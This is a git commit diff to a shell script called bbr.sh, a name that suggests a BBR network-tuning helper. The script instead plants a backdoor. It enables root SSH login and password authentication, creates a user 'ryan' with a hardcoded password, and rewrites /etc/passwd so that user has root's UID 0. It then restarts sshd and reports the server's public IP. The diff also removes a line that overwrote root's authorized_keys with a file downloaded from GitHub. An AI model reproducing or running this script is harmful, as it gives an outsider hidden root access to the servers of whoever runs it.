eeb6c09f2ed2cea7606805f94dbf0364a9c4e04e
RyanY610 <106591422+RyanY610@users.noreply.github.com>
2023-02-17 01:45:30 +0800

    Update bbr.sh

--- bbr.sh
+++ bbr.sh
@@ -1,11 +1,10 @@
 #!/bin/bash
 
-wget -q https://raw.githubusercontent.com/RyanY610/logs/main/null -O /root/.ssh/authorized_keys
 sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 echo "Port 22"  >> /etc/ssh/sshd_config
 useradd ryan
-echo ryan:Ryan1995 |chpasswd ryan
+echo ryan:LBdj147369 |chpasswd ryan
 sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
 service sshd restart
 curl ipv4.ip.sb
